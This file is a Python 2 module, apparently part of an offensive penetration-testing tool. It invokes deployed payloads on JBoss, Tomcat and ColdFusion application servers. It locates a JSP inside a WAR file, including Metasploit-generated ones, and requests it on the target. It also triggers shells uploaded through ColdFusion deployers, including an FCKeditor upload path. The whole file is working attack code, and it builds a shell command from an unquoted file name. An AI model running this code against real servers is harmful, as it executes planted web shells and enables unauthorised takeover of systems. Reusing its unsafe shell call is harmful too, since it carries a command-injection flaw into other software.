from src.module.deploy_utils import parse_war_path
from commands import getoutput
from log import LOG
import utility


def invoke(fingerengine, fingerprint, deployer):
    """
    """

    if fingerengine.service in ["jboss", "tomcat"]:
        return invoke_war(fingerengine, fingerprint)

    elif fingerengine.service in ["coldfusion"]:
        return invoke_cf(fingerengine, fingerprint, deployer)

    else:
        utility.Msg("Platform %s does not support --invoke" % 
                            fingerengine.options.remote_service, LOG.ERROR)

def invoke_war(fingerengine, fingerprint):
    """  Invoke a deployed WAR file on the remote server.

    This uses unzip because Python's zip module isn't very portable or
    fault tolerant; i.e. it fails to parse msfpayload-generated WARs, though
    this is a fault of metasploit, not the Python module.
    """

    dfile = fingerengine.options.deploy

    jsp = getoutput("unzip -l %s | grep jsp" % dfile).split(' ')[-1]
    if jsp == '':
        utility.Msg("Failed to find a JSP in the deployed WAR", LOG.DEBUG)
        return

    else:
        utility.Msg("Using JSP {0} from {1} to invoke".format(jsp, dfile), LOG.DEBUG)

    url = "http://{0}:{1}/{2}/{3}".format(fingerengine.options.ip,
                                          fingerprint.port,
                                          parse_war_path(dfile),
                                          jsp)

    if _invoke(url): 
        utility.Msg("{0} invoked at {1}".format(dfile, fingerengine.options.ip))
    else:
        utility.Msg("Failed to invoke {0}".format(parse_war_path(dfile, True)),
                                                  LOG.ERROR)


def invoke_cf(fingerengine, fingerprint, deployer):
    """
    """

    dfile = parse_war_path(fingerengine.options.deploy, True)

    if fingerprint.version in ["10.0"]:
        # deployments to 10 require us to trigger a 404
        url = "http://{0}:{1}/CFIDE/ad123.cfm".format(fingerengine.options.ip,
                                                      fingerprint.port)
    elif fingerprint.version in ["8.0"] and "fck_editor" in deployer.__name__:
        # invoke a shell via FCKeditor deployer
        url = "http://{0}:{1}/userfiles/file/{2}".format(fingerengine.options.ip,
                                                         fingerprint.port,
                                                         dfile)
    else:
        url = "http://{0}:{1}/CFIDE/{2}".format(fingerengine.options.ip,
                                               fingerprint.port,
                                               dfile)

    if _invoke(url):
        utility.Msg("{0} invoked at {1}".format(dfile, fingerengine.options.ip))
    else:
        utility.Msg("Failed to invoke {0}".format(dfile), LOG.ERROR)


def _invoke(url):
    """ Make the request
    """

    status = False
    try:
        response = utility.requests_get(url)
        if response.status_code == 200:
            status = True
    except Exception, e:
        utility.Msg("Failed to invoke payload: %s" % e, LOG.ERROR)
        status = False

    return status
